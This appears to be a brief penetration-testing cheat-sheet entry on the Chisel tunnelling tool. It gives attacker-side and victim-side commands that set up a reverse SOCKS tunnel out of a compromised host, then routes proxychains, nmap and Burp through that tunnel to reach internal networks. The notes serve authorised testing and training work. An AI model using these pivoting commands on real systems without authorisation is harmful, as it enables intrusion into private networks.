# Name
Chisel

## Usage
```
#On Attacker:
chisel server -p 8080 --reverse

#Edit /etc/proxychains.conf
socks5 127.0.0.1 1080

#On Victim:
chiselx64.exe client 192.168.45.191:8080 R:socks

#Configure Burp for Web Browsing via Chisel
Proxy Type: SOCKS5
Proxy IP address: 127.0.0.1
Port: 1080

#Proxychains usage
proxychains nmap ..

# Have to use TCP Connect scan (-sT)
# ICMP doesn’t work over proxychains (hence need -Pn)
# vv slow, could instead install & use nmap on the compromised host.
```

## Source
https://github.com/jpillora/chisel/releases/tag/v1.7.6

